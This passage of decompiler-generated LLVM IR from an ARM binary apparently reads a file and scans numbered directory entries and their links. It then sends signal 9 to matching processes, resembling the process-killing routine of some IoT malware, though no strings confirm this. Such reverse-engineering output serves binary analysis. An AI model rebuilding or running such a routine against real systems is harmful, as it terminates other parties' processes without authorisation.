  %v2_c9e4 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_c9e4, i32* @sb, align 4
  %v0_c9e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c9e8 = udiv i32 %v0_c9e8, 256
  %v1_c9ec = urem i32 %v0_c9e8, 256
  store i32 %v1_c9ec, i32* @r4, align 4
  %v3_c9fc = trunc i32 %v3_c9e8 to i8
  %v4_c9fc = call i32 @function_1077c(i8 %v3_c9fc, i32 16, i32 %v2_c9e4)
  %v2_ca04 = call i32 @function_1031c(i8* nonnull %stack_var_-72)
  %v7_ca08 = icmp eq i32 %v2_ca04, 2
  br i1 %v7_ca08, label %dec_label_pc_cecc, label %dec_label_pc_ca10

dec_label_pc_ca10:                                ; preds = %dec_label_pc_c964, %dec_label_pc_cecc
  %v1_ca14 = call i32 @function_fd64(i32 15)
  %v1_ca1c = call i32 @function_fd64(i32 16)
  %v1_ca24 = call i32 @function_fd64(i32 17)
  %v1_ca2c = call i32 @function_fd64(i32 19)
  %v0_ca30 = load i32, i32* @r5, align 4
  %v2_ca38 = inttoptr i32 %v0_ca30 to i32*
  %v3_ca38 = call i32 @function_fca0(i32 19, i32* %v2_ca38)
  %v0_ca3c = load i32, i32* @r5, align 4
  %v2_ca40 = call i32 @function_109e8(i32 %v3_ca38, i32 %v0_ca3c)
  %v7_ca44 = icmp eq i32 %v2_ca40, -1
  store i32 %v2_ca40, i32* @r8, align 4
  br i1 %v7_ca44, label %bb, label %dec_label_pc_ca54.preheader

bb:                                               ; preds = %dec_label_pc_ca10
  %v1_ca4c = load i32, i32* @r5, align 4
  store i32 %v1_ca4c, i32* @r4, align 4
  br label %dec_label_pc_ce68

dec_label_pc_ca54.preheader:                      ; preds = %dec_label_pc_ca10
  %v4_ca6056 = call i32 @function_1057c(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca40)
  %v2_ca6458 = icmp eq i32 %v4_ca6056, 0
  br i1 %v2_ca6458, label %dec_label_pc_cbec.loopexit, label %dec_label_pc_ca6c.lr.ph

dec_label_pc_ca6c.lr.ph:                          ; preds = %dec_label_pc_ca54.preheader
  %v2_cab4 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_ca6c

dec_label_pc_ca6c:                                ; preds = %dec_label_pc_ca6c.lr.ph, %dec_label_pc_ca54.backedge
  %v3_ca70 = load i8, i8* %stack_var_-585, align 1
  %v4_ca70 = sext i8 %v3_ca70 to i32
  %v2_ca74 = icmp eq i8 %v3_ca70, 0
  br i1 %v2_ca74, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_ca6c
  %v8_ca78 = icmp eq i8 %v3_ca70, 58
  br i1 %v8_ca78, label %.thread8, label %dec_label_pc_ca8c

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_caa4

bb126:                                            ; preds = %dec_label_pc_ca6c
  br label %dec_label_pc_caa4

dec_label_pc_ca8c:                                ; preds = %bb125
  %v1_ca94.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ca90

dec_label_pc_ca90:                                ; preds = %bb127, %dec_label_pc_ca8c
  %v0_ca90 = phi i32 [ %v1_ca90, %bb127 ], [ 0, %dec_label_pc_ca8c ]
  %v1_ca90 = add i32 %v0_ca90, 1
  %v2_ca94 = add i32 %v1_ca90, %v1_ca94.pre
  %v3_ca94 = inttoptr i32 %v2_ca94 to i8*
  %v4_ca94 = load i8, i8* %v3_ca94, align 1
  %v6_ca94 = zext i8 %v4_ca94 to i32
  %v2_ca98 = icmp eq i8 %v4_ca94, 0
  br i1 %v2_ca98, label %dec_label_pc_caa4, label %bb127

bb127:                                            ; preds = %dec_label_pc_ca90
  %v8_ca9c = icmp eq i8 %v4_ca94, 58
  br i1 %v8_ca9c, label %dec_label_pc_caa4, label %dec_label_pc_ca90

dec_label_pc_caa4:                                ; preds = %dec_label_pc_ca90, %bb127, %bb126, %.thread8
  %v1_cad0 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_ca90, %bb127 ], [ %v1_ca90, %dec_label_pc_ca90 ]
  %v0_caa4 = phi i32 [ %v4_ca70, %.thread8 ], [ %v4_ca70, %bb126 ], [ %v6_ca94, %bb127 ], [ %v6_ca94, %dec_label_pc_ca90 ]
  %v2_caa4 = icmp eq i32 %v0_caa4, 0
  br i1 %v2_caa4, label %dec_label_pc_ca54.backedge, label %dec_label_pc_caac

dec_label_pc_ca54.backedge:                       ; preds = %dec_label_pc_caa4, %dec_label_pc_cb74, %dec_label_pc_cbc0, %dec_label_pc_caf0
  %v0_ca5c = load i32, i32* @r8, align 4
  %v4_ca60 = call i32 @function_1057c(i8* nonnull %stack_var_-585, i32 512, i32 %v0_ca5c)
  %v2_ca64 = icmp eq i32 %v4_ca60, 0
  br i1 %v2_ca64, label %dec_label_pc_cbec.loopexit, label %dec_label_pc_ca6c

dec_label_pc_caac:                                ; preds = %dec_label_pc_caa4
  %v1_cab0 = add i32 %v1_cad0, 2
  %v2_cab8 = add i32 %v1_cab0, %v2_cab4
  %v1_cabc = add i32 %v2_cab8, -545
  %v2_cabc = inttoptr i32 %v1_cabc to i8*
  %v3_cabc = load i8, i8* %v2_cabc, align 1
  %v2_cac0 = icmp eq i8 %v3_cabc, 0
  br i1 %v2_cac0, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_caac
  %v8_cac4 = icmp eq i8 %v3_cabc, 32
  br i1 %v8_cac4, label %.thread13, label %dec_label_pc_cad0

.thread13:                                        ; preds = %bb128
  store i32 %v1_cab0, i32* @r5, align 4
  br label %dec_label_pc_caf0

bb129:                                            ; preds = %dec_label_pc_caac
  store i32 %v1_cab0, i32* @r5, align 4
  br label %dec_label_pc_caf0

dec_label_pc_cad0:                                ; preds = %bb128
  %v0_cad0 = load i32, i32* @r6, align 4
  %v2_cad0 = add i32 %v0_cad0, %v1_cad0
  br label %dec_label_pc_cad8

dec_label_pc_cad8:                                ; preds = %bb130, %dec_label_pc_cad0
  %v0_cae416 = phi i32 [ %v1_cae4, %bb130 ], [ %v1_cab0, %dec_label_pc_cad0 ]
  %v0_cae818 = phi i32 [ %v1_cae8, %bb130 ], [ %v2_cad0, %dec_label_pc_cad0 ]
  %v1_cad8 = add i32 %v0_cae818, 3
  %v2_cad8 = inttoptr i32 %v1_cad8 to i8*
  %v3_cad8 = load i8, i8* %v2_cad8, align 1
  %v2_cadc = icmp eq i8 %v3_cad8, 0
  br i1 %v2_cadc, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_cad8
  %v1_cae417 = add i32 %v0_cae416, 1
  store i32 %v1_cae417, i32* @r5, align 4
  br label %dec_label_pc_caf0

bb130:                                            ; preds = %dec_label_pc_cad8
  %v8_cae0 = icmp eq i8 %v3_cad8, 32
  %v1_cae4 = add i32 %v0_cae416, 1
  store i32 %v1_cae4, i32* @r5, align 4
  %v1_cae8 = add i32 %v0_cae818, 1
  br i1 %v8_cae0, label %dec_label_pc_caf0, label %dec_label_pc_cad8

dec_label_pc_caf0:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cafc = phi i32 [ %v1_cae417, %.thread15 ], [ %v1_cab0, %.thread13 ], [ %v1_cab0, %bb129 ], [ %v1_cae4, %bb130 ]
  %v0_caf0 = load i32, i32* @r6, align 4
  %v2_caf0 = add i32 %v0_caf0, %v1_cab0
  store i32 %v2_caf0, i32* @r4, align 4
  %v2_cafc = add i32 %v1_cafc, %v2_cab4
  store i32 0, i32* @r7, align 4
  %v3_cb04 = add i32 %v2_cafc, -545
  %v4_cb04 = inttoptr i32 %v3_cb04 to i8*
  store i8 0, i8* %v4_cb04, align 1
  %v0_cb08 = load i32, i32* @r4, align 4
  %v1_cb0c = inttoptr i32 %v0_cb08 to i8*
  %v2_cb0c = call i32 @function_1031c(i8* %v1_cb0c)
  store i32 %v2_cb0c, i32* @r1, align 4
  %v0_cb18 = load i32, i32* @r4, align 4
  %v3_cb1c = inttoptr i32 %v0_cb18 to i8*
  %v4_cb1c = call i32 @function_1066c(i8* %v3_cb1c, i32 %v2_cb0c, i32 %v2_c9e4)
  %v7_cb20 = icmp eq i32 %v4_cb1c, -1
  br i1 %v7_cb20, label %dec_label_pc_ca54.backedge, label %dec_label_pc_cb3c.preheader

dec_label_pc_cb3c.preheader:                      ; preds = %dec_label_pc_caf0
  %v1_cb24 = load i32, i32* @r7, align 4
  %v1_cb28 = load i32, i32* @r6, align 4
  %v2_cb28 = load i32, i32* @r5, align 4
  %v3_cb28 = add i32 %v2_cb28, %v1_cb28
  store i32 %v1_cb24, i32* @lr, align 4
  %v1_cb3c48 = add i32 %v3_cb28, 2
  %v2_cb3c49 = inttoptr i32 %v1_cb3c48 to i8*
  %v3_cb3c50 = load i8, i8* %v2_cb3c49, align 1
  %v2_cb4052 = icmp eq i8 %v3_cb3c50, 0
  %v1_cb4454 = add i32 %v2_cb28, 2
  br i1 %v2_cb4052, label %dec_label_pc_cb74, label %dec_label_pc_cb4c

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cb3c.preheader, %dec_label_pc_cb3c.backedge
  %v0_cb7483 = phi i32 [ %v0_cb7481, %dec_label_pc_cb3c.backedge ], [ %v1_cb24, %dec_label_pc_cb3c.preheader ]
  %v0_cb5c.pr = phi i32 [ %v0_cb5c.pr70, %dec_label_pc_cb3c.backedge ], [ %v1_cb24, %dec_label_pc_cb3c.preheader ]
  %v0_ce7c = phi i32 [ %v0_ce7c73, %dec_label_pc_cb3c.backedge ], [ %v1_cb24, %dec_label_pc_cb3c.preheader ]
  %v0_cb4478 = phi i32 [ %v1_cb44, %dec_label_pc_cb3c.backedge ], [ %v1_cb4454, %dec_label_pc_cb3c.preheader ]
  %v0_cb6c = phi i32 [ %v0_cb3c, %dec_label_pc_cb3c.backedge ], [ %v3_cb28, %dec_label_pc_cb3c.preheader ]
  %v1_cb50.in = phi i8 [ %v3_cb3c, %dec_label_pc_cb3c.backedge ], [ %v3_cb3c50, %dec_label_pc_cb3c.preheader ]
  %v7_cb4c = icmp eq i8 %v1_cb50.in, 9
  br i1 %v7_cb4c, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb4c
  %v8_cb50 = icmp eq i8 %v1_cb50.in, 32
  br i1 %v8_cb50, label %.thread27, label %dec_label_pc_cb5c

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cb68

bb132:                                            ; preds = %dec_label_pc_cb4c
  br label %dec_label_pc_cb68

dec_label_pc_cb5c:                                ; preds = %bb131
  %v7_cb5c = icmp eq i32 %v0_cb5c.pr, 1
  br i1 %v7_cb5c, label %dec_label_pc_ce7c, label %dec_label_pc_cb64

dec_label_pc_cb64:                                ; preds = %dec_label_pc_ce7c, %dec_label_pc_cb5c
  %v0_cb6875 = phi i32 [ %v1_ce7c, %dec_label_pc_ce7c ], [ %v0_ce7c, %dec_label_pc_cb5c ]
  br label %dec_label_pc_cb68

dec_label_pc_cb68:                                ; preds = %bb132, %.thread27, %dec_label_pc_cb64
  %v0_cb68 = phi i32 [ %v0_ce7c, %.thread27 ], [ %v0_ce7c, %bb132 ], [ %v0_cb6875, %dec_label_pc_cb64 ]
  %v0_cb5c.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cb64 ]
  %v7_cb70 = icmp sgt i32 %v0_cb68, 6
  br i1 %v7_cb70, label %dec_label_pc_cb74, label %dec_label_pc_cb3c.backedge

dec_label_pc_cb74:                                ; preds = %dec_label_pc_cb3c.backedge, %dec_label_pc_cb68, %dec_label_pc_cb3c.preheader
  %v1_cbc4 = phi i32 [ %v1_cb4454, %dec_label_pc_cb3c.preheader ], [ %v1_cb44, %dec_label_pc_cb3c.backedge ], [ %v0_cb4478, %dec_label_pc_cb68 ]
  %v0_cb74 = phi i32 [ %v1_cb24, %dec_label_pc_cb3c.preheader ], [ %v0_cb7481, %dec_label_pc_cb3c.backedge ], [ %v0_cb7483, %dec_label_pc_cb68 ]
  %v2_cb74 = icmp eq i32 %v0_cb74, 0
  br i1 %v2_cb74, label %dec_label_pc_ca54.backedge, label %dec_label_pc_cb80

dec_label_pc_cb80:                                ; preds = %dec_label_pc_cb74
  %v2_cb88 = add i32 %v1_cbc4, %v2_cab4
  %v1_cb8c = add i32 %v2_cb88, -545
  %v2_cb8c = inttoptr i32 %v1_cb8c to i8*
  %v3_cb8c = load i8, i8* %v2_cb8c, align 1
  %v2_cb90 = icmp eq i8 %v3_cb8c, 0
  br i1 %v2_cb90, label %dec_label_pc_cbc0, label %bb133

bb133:                                            ; preds = %dec_label_pc_cb80
  %v8_cb94 = icmp eq i8 %v3_cb8c, 32
  br i1 %v8_cb94, label %dec_label_pc_cbc0, label %dec_label_pc_cb9c

dec_label_pc_cb9c:                                ; preds = %bb133
  %v2_cb9c = add i32 %v1_cbc4, %v1_cb28
  br label %dec_label_pc_cba0

dec_label_pc_cba0:                                ; preds = %bb134, %dec_label_pc_cb9c
  %v0_cbac30 = phi i32 [ %v1_cbac, %bb134 ], [ %v1_cbc4, %dec_label_pc_cb9c ]
  %v0_cba0 = phi i32 [ %v1_cba0, %bb134 ], [ %v2_cb9c, %dec_label_pc_cb9c ]
  %v1_cba0 = add i32 %v0_cba0, 1
  %v2_cba0 = inttoptr i32 %v1_cba0 to i8*
  %v3_cba0 = load i8, i8* %v2_cba0, align 1
  %v2_cba4 = icmp eq i8 %v3_cba0, 0
  br i1 %v2_cba4, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cba0
  %v1_cbac31 = add i32 %v0_cbac30, 1
  br label %dec_label_pc_cbb4

bb134:                                            ; preds = %dec_label_pc_cba0
  %v8_cba8 = icmp eq i8 %v3_cba0, 32
  %v1_cbac = add i32 %v0_cbac30, 1
  br i1 %v8_cba8, label %dec_label_pc_cbb4, label %dec_label_pc_cba0

dec_label_pc_cbb4:                                ; preds = %bb134, %.thread29
  %v1_cbbc = phi i32 [ %v1_cbac31, %.thread29 ], [ %v1_cbac, %bb134 ]
  %v2_cbbc = add i32 %v1_cbbc, %v2_cab4
  br label %dec_label_pc_cbc0

dec_label_pc_cbc0:                                ; preds = %dec_label_pc_cb80, %bb133, %dec_label_pc_cbb4
  %v2_cbcc = phi i32 [ %v2_cb88, %dec_label_pc_cb80 ], [ %v2_cb88, %bb133 ], [ %v2_cbbc, %dec_label_pc_cbb4 ]
  %v2_cbc4 = add i32 %v1_cbc4, %v1_cb28
  store i32 %v2_cbc4, i32* @r4, align 4
  %v3_cbcc = add i32 %v2_cbcc, -545
  %v4_cbcc = inttoptr i32 %v3_cbcc to i8*
  store i8 0, i8* %v4_cbcc, align 1
  %v1_cbd0 = inttoptr i32 %v2_cbc4 to i8*
  %v2_cbd0 = call i32 @function_1031c(i8* %v1_cbd0)
  %v8_cbd8 = icmp sgt i32 %v2_cbd0, 15
  br i1 %v8_cbd8, label %dec_label_pc_ca54.backedge, label %dec_label_pc_cbdc

dec_label_pc_cbdc:                                ; preds = %dec_label_pc_cbc0
  %v0_cbe0 = load i32, i32* @r4, align 4
  %v2_cbe4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cbe4, i32* @r0, align 4
  %v2_cbe8 = bitcast i32* %stack_var_-56 to i8*
  %v3_cbe8 = call i32 @function_10344(i8* %v2_cbe8, i32 %v0_cbe0)
  br label %dec_label_pc_cbec

dec_label_pc_cbec.loopexit:                       ; preds = %dec_label_pc_ca54.backedge, %dec_label_pc_ca54.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cbec

dec_label_pc_cbec:                                ; preds = %dec_label_pc_cbec.loopexit, %dec_label_pc_cbdc
  %v1_cbfc.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cbec.loopexit ], [ %v2_cbe8, %dec_label_pc_cbdc ]
  %v2_cbf8.pre-phi = phi i32 [ %.pre, %dec_label_pc_cbec.loopexit ], [ %v2_cbe4, %dec_label_pc_cbdc ]
  %v0_cbec = load i32, i32* @r8, align 4
  %v1_cbf0 = call i32 @function_10ddc(i32 %v0_cbec)
  %v2_cbfc = call i32 @function_1031c(i8* %v1_cbfc.pre-phi)
  store i32 %v2_cbfc, i32* @r4, align 4
  %v2_cc00 = icmp eq i32 %v2_cbfc, 0
  br i1 %v2_cc00, label %dec_label_pc_cea8, label %dec_label_pc_cc08

dec_label_pc_cc08:                                ; preds = %dec_label_pc_cbec
  %v3_cc10 = call i32 @function_fca0(i32 15, i32* null)
  %v1_cc14 = call i32 @function_10fd8(i32 %v3_cc10)
  store i32 %v1_cc14, i32* @sb, align 4
  %v2_cc18 = icmp eq i32 %v1_cc14, 0
  br i1 %v2_cc18, label %dec_label_pc_ce48, label %dec_label_pc_cc28.preheader

dec_label_pc_cc28.preheader:                      ; preds = %dec_label_pc_cc08
  store i32 0, i32* @r5, align 4
  %v1_cc2c43 = inttoptr i32 %v1_cc14 to i32*
  %v2_cc2c44 = call i32 @function_1111c(i32* %v1_cc2c43)
  %v2_cc3046 = icmp eq i32 %v2_cc2c44, 0
  br i1 %v2_cc3046, label %dec_label_pc_ce3c, label %dec_label_pc_cc38.preheader

dec_label_pc_cc28.loopexit:                       ; preds = %dec_label_pc_cc40, %dec_label_pc_cc50, %dec_label_pc_ccbc
  %v0_cc28 = load i32, i32* @sb, align 4
  %v1_cc2c = inttoptr i32 %v0_cc28 to i32*
  %v2_cc2c = call i32 @function_1111c(i32* %v1_cc2c)
  %v2_cc30 = icmp eq i32 %v2_cc2c, 0
  br i1 %v2_cc30, label %dec_label_pc_ce3c, label %dec_label_pc_cc38.preheader

dec_label_pc_cc38.preheader:                      ; preds = %dec_label_pc_cc28.preheader, %dec_label_pc_cc28.loopexit
  %v0_cc4091 = phi i32 [ %v2_cc2c, %dec_label_pc_cc28.loopexit ], [ %v2_cc2c44, %dec_label_pc_cc28.preheader ]
  br label %dec_label_pc_cc38

dec_label_pc_cc38:                                ; preds = %dec_label_pc_cc38.preheader, %dec_label_pc_ce24
  %v0_cc58 = phi i32 [ %v0_cc4091, %dec_label_pc_cc38.preheader ], [ %v2_ce30, %dec_label_pc_ce24 ]
  %v0_cc38 = load i32, i32* @r5, align 4
  %v2_cc38 = icmp eq i32 %v0_cc38, 0
  br i1 %v2_cc38, label %dec_label_pc_cc40, label %dec_label_pc_ce3c

dec_label_pc_cc40:                                ; preds = %dec_label_pc_cc38
  %v1_cc40 = add i32 %v0_cc58, 11
  %v2_cc40 = inttoptr i32 %v1_cc40 to i8*
  %v3_cc40 = load i8, i8* %v2_cc40, align 1
  %v4_cc40 = zext i8 %v3_cc40 to i32
  %v1_cc44 = add nsw i32 %v4_cc40, -48
  %tmp = icmp ugt i32 %v1_cc44, 9
  br i1 %tmp, label %dec_label_pc_cc28.loopexit, label %dec_label_pc_cc50

dec_label_pc_cc50:                                ; preds = %dec_label_pc_cc40
  store i32 %v1_cc40, i32* @r7, align 4
  %v3_cc5c = call i32 @function_fca0(i32 15, i32* null)
  store i32 %v2_c9bc, i32* @r0, align 4
  %v3_cc68 = call i32 @function_10344(i8* %v2_c9e0, i32 %v3_cc5c)
  %v2_cc70 = call i32 @function_1031c(i8* %v2_c9e0)
  %v0_cc74 = load i32, i32* @r7, align 4
  %v1_cc78 = load i32, i32* @sl, align 4
  %v2_cc78 = add i32 %v1_cc78, %v2_cc70
  store i32 %v2_cc78, i32* @r0, align 4
  %v2_cc7c = inttoptr i32 %v2_cc78 to i8*
  %v3_cc7c = call i32 @function_10344(i8* %v2_cc7c, i32 %v0_cc74)
  %v2_cc84 = call i32 @function_1031c(i8* %v2_c9e0)
  %v0_cc88 = load i32, i32* @r5, align 4
  store i32 %v2_cc84, i32* @r4, align 4
  %v2_cc94 = inttoptr i32 %v0_cc88 to i32*
  %v3_cc94 = call i32 @function_fca0(i32 16, i32* %v2_cc94)
  %v0_cc9c = load i32, i32* @r4, align 4
  %v1_cc9c = load i32, i32* @sl, align 4
  %v2_cc9c = add i32 %v1_cc9c, %v0_cc9c
  store i32 %v2_cc9c, i32* @r0, align 4
  %v2_cca0 = inttoptr i32 %v2_cc9c to i8*
  %v3_cca0 = call i32 @function_10344(i8* %v2_cca0, i32 %v3_cc94)
  %v3_ccb0 = call i32 @function_10b40(i32 %v2_c9bc, i32 %v2_c9ac, i32 4096)
  %v7_ccb4 = icmp eq i32 %v3_ccb0, -1
  br i1 %v7_ccb4, label %dec_label_pc_cc28.loopexit, label %dec_label_pc_ccbc

dec_label_pc_ccbc:                                ; preds = %dec_label_pc_cc50
  %v0_ccbc = load i32, i32* @r5, align 4
  %v2_ccc4 = inttoptr i32 %v0_ccbc to i32*
  %v3_ccc4 = call i32 @function_fca0(i32 15, i32* %v2_ccc4)
  store i32 %v2_c9bc, i32* @r0, align 4
  %v3_ccd0 = call i32 @function_10344(i8* %v2_c9e0, i32 %v3_ccc4)
  %v2_ccd8 = call i32 @function_1031c(i8* %v2_c9e0)
  %v0_ccdc = load i32, i32* @r7, align 4
  %v1_cce0 = load i32, i32* @sl, align 4
  %v2_cce0 = add i32 %v1_cce0, %v2_ccd8
  store i32 %v2_cce0, i32* @r0, align 4
  %v2_cce4 = inttoptr i32 %v2_cce0 to i8*
  %v3_cce4 = call i32 @function_10344(i8* %v2_cce4, i32 %v0_ccdc)
  %v2_ccec = call i32 @function_1031c(i8* %v2_c9e0)
  %v0_ccf0 = load i32, i32* @r5, align 4
  store i32 %v2_ccec, i32* @r4, align 4
  %v2_ccfc = inttoptr i32 %v0_ccf0 to i32*
  %v3_ccfc = call i32 @function_fca0(i32 17, i32* %v2_ccfc)
  %v0_cd04 = load i32, i32* @r4, align 4
  %v1_cd04 = load i32, i32* @sl, align 4
  %v2_cd04 = add i32 %v1_cd04, %v0_cd04
  store i32 %v2_cd04, i32* @r0, align 4
  %v2_cd08 = inttoptr i32 %v2_cd04 to i8*
  %v3_cd08 = call i32 @function_10344(i8* %v2_cd08, i32 %v3_ccfc)
  %v1_cd10 = call i32 @function_10fd8(i32 %v2_c9bc)
  store i32 %v1_cd10, i32* @r8, align 4
  %v2_cd14 = icmp eq i32 %v1_cd10, 0
  br i1 %v2_cd14, label %dec_label_pc_cc28.loopexit, label %dec_label_pc_cd1c.preheader

dec_label_pc_cd1c.preheader:                      ; preds = %dec_label_pc_ccbc
  %v1_cd2038 = inttoptr i32 %v1_cd10 to i32*
  %v2_cd2039 = call i32 @function_1111c(i32* %v1_cd2038)
  store i32 %v2_cd2039, i32* @r6, align 4
  %v2_cd2441 = icmp eq i32 %v2_cd2039, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9ac, i32* @r0, align 4
  br i1 %v2_cd2441, label %dec_label_pc_ce24, label %dec_label_pc_cd34thread-pre-split

dec_label_pc_cd1c.loopexit:                       ; preds = %dec_label_pc_cd3c, %dec_label_pc_cdd4
  %v0_cd1c = load i32, i32* @r8, align 4
  %v1_cd20 = inttoptr i32 %v0_cd1c to i32*
  %v2_cd20 = call i32 @function_1111c(i32* %v1_cd20)
  store i32 %v2_cd20, i32* @r6, align 4
  %v2_cd24 = icmp eq i32 %v2_cd20, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9ac, i32* @r0, align 4
  br i1 %v2_cd24, label %dec_label_pc_ce24, label %dec_label_pc_cd34thread-pre-split

dec_label_pc_cd34thread-pre-split:                ; preds = %dec_label_pc_cd1c.preheader, %dec_label_pc_cd1c.loopexit
  %v0_cd34.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd34

dec_label_pc_cd34:                                ; preds = %dec_label_pc_cd34thread-pre-split, %dec_label_pc_cdfc
  %v0_cd34 = phi i32 [ %v0_cd34.pr, %dec_label_pc_cd34thread-pre-split ], [ 1, %dec_label_pc_cdfc ]
  %v2_cd34 = icmp eq i32 %v0_cd34, 0
  br i1 %v2_cd34, label %dec_label_pc_cd3c, label %dec_label_pc_ce24

dec_label_pc_cd3c:                                ; preds = %dec_label_pc_cd34
  %v0_cd3c = call i32 @function_103b0()
  %v0_cd40 = load i32, i32* @r5, align 4
  %v2_cd48 = inttoptr i32 %v0_cd40 to i32*
  %v3_cd48 = call i32 @function_fca0(i32 15, i32* %v2_cd48)
  store i32 %v2_c9bc, i32* @r0, align 4
  %v3_cd54 = call i32 @function_10344(i8* %v2_c9e0, i32 %v3_cd48)
  %v2_cd5c = call i32 @function_1031c(i8* %v2_c9e0)
  %v0_cd60 = load i32, i32* @r7, align 4
  %v1_cd64 = load i32, i32* @sl, align 4
  %v2_cd64 = add i32 %v1_cd64, %v2_cd5c
  store i32 %v2_cd64, i32* @r0, align 4
  %v2_cd68 = inttoptr i32 %v2_cd64 to i8*
  %v3_cd68 = call i32 @function_10344(i8* %v2_cd68, i32 %v0_cd60)
  %v2_cd70 = call i32 @function_1031c(i8* %v2_c9e0)
  %v0_cd74 = load i32, i32* @r5, align 4
  store i32 %v2_cd70, i32* @r4, align 4
  %v2_cd80 = inttoptr i32 %v0_cd74 to i32*
  %v3_cd80 = call i32 @function_fca0(i32 17, i32* %v2_cd80)
  %v0_cd88 = load i32, i32* @r4, align 4
  %v1_cd88 = load i32, i32* @sl, align 4
  %v2_cd88 = add i32 %v1_cd88, %v0_cd88
  store i32 %v2_cd88, i32* @r0, align 4
  %v2_cd8c = inttoptr i32 %v2_cd88 to i8*
  %v3_cd8c = call i32 @function_10344(i8* %v2_cd8c, i32 %v3_cd80)
  %v2_cd94 = call i32 @function_1031c(i8* %v2_c9e0)
  %v1_cd9c = load i32, i32* @sl, align 4
  %v2_cd9c = add i32 %v1_cd9c, %v2_cd94
  store i32 %v2_cd9c, i32* @r0, align 4
  %v2_cda0 = inttoptr i32 %v2_cd9c to i8*
  %v3_cda0 = call i32 @function_10344(i8* %v2_cda0, i32 ptrtoint (i32* @global_var_1617c.60 to i32))
  %v2_cda8 = call i32 @function_1031c(i8* %v2_c9e0)
  %v0_cdac = load i32, i32* @r6, align 4
  %v1_cdac = add i32 %v0_cdac, 11
  %v1_cdb0 = load i32, i32* @sl, align 4
  %v2_cdb0 = add i32 %v1_cdb0, %v2_cda8
  store i32 %v2_cdb0, i32* @r0, align 4
  %v2_cdb4 = inttoptr i32 %v2_cdb0 to i8*
  %v3_cdb4 = call i32 @function_10344(i8* %v2_cdb4, i32 %v1_cdac)
  %v3_cdc4 = call i32 @function_10b40(i32 %v2_c9bc, i32 %v2_c9ac, i32 4096)
  %v7_cdc8 = icmp eq i32 %v3_cdc4, -1
  br i1 %v7_cdc8, label %dec_label_pc_cd1c.loopexit, label %dec_label_pc_cdd4

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cd3c
  %v2_cdd4 = call i32 @function_1031c(i8* %v2_c9cc)
  store i32 %v2_cdd4, i32* @r1, align 4
  %v4_cde8 = call i32 @function_1066c(i8* %v2_c9cc, i32 %v2_cdd4, i32 %v2_cbf8.pre-phi)
  %v7_cdec = icmp eq i32 %v4_cde8, -1
  br i1 %v7_cdec, label %dec_label_pc_cd1c.loopexit, label %dec_label_pc_cdfc

dec_label_pc_cdfc:                                ; preds = %dec_label_pc_cdd4
  %v0_cdf4 = load i32, i32* @r7, align 4
  %v2_cdfc = inttoptr i32 %v0_cdf4 to i8*
  %v3_cdfc = call i32 @function_10440(i8* %v2_cdfc, i32 10)
  %v2_ce04 = call i32 @function_10ba8(i32 %v3_cdfc, i32 9)
  %v0_ce08 = load i32, i32* @r8, align 4
  %v1_ce0c = inttoptr i32 %v0_ce08 to i32*
  %v2_ce0c = call i32 @function_1111c(i32* %v1_ce0c)
  store i32 %v2_ce0c, i32* @r6, align 4
  %v2_ce10 = icmp eq i32 %v2_ce0c, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9ac, i32* @r0, align 4
  br i1 %v2_ce10, label %dec_label_pc_ce24, label %dec_label_pc_cd34

dec_label_pc_ce24:                                ; preds = %dec_label_pc_cd1c.loopexit, %dec_label_pc_cdfc, %dec_label_pc_cd34, %dec_label_pc_cd1c.preheader
  %v0_ce24 = load i32, i32* @r8, align 4
  %v1_ce28 = inttoptr i32 %v0_ce24 to i32*
  %v2_ce28 = call i32 @function_10e10(i32* %v1_ce28)
  %v0_ce2c = load i32, i32* @sb, align 4
  %v1_ce30 = inttoptr i32 %v0_ce2c to i32*
  %v2_ce30 = call i32 @function_1111c(i32* %v1_ce30)
  %v2_ce34 = icmp eq i32 %v2_ce30, 0
  br i1 %v2_ce34, label %dec_label_pc_ce3c, label %dec_label_pc_cc38

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_cc28.loopexit, %dec_label_pc_ce24, %dec_label_pc_cc38, %dec_label_pc_cc28.preheader
  %v0_ce3c = load i32, i32* @sb, align 4
  %v1_ce40 = inttoptr i32 %v0_ce3c to i32*
  %v2_ce40 = call i32 @function_10e10(i32* %v1_ce40)
  %v0_ce44 = load i32, i32* @r5, align 4
  %v1_ce44 = urem i32 %v0_ce44, 256
  br label %dec_label_pc_ce48

dec_label_pc_ce48:                                ; preds = %dec_label_pc_cc08, %dec_label_pc_ce3c
  %storemerge = phi i32 [ %v1_ce44, %dec_label_pc_ce3c ], [ 0, %dec_label_pc_cc08 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce4c = call i32 @function_12f00(i32 1)
  %v1_ce54 = call i32 @function_fcc4(i32 15)
  %v1_ce5c = call i32 @function_fcc4(i32 16)
  %v1_ce64 = call i32 @function_fcc4(i32 17)
  br label %dec_label_pc_ce68

dec_label_pc_ce68:                                ; preds = %bb, %dec_label_pc_cea8, %dec_label_pc_ce48
  %v0_ce68 = load i32, i32* @r4, align 4
  store i32 %v3_c964, i32* @r4, align 4
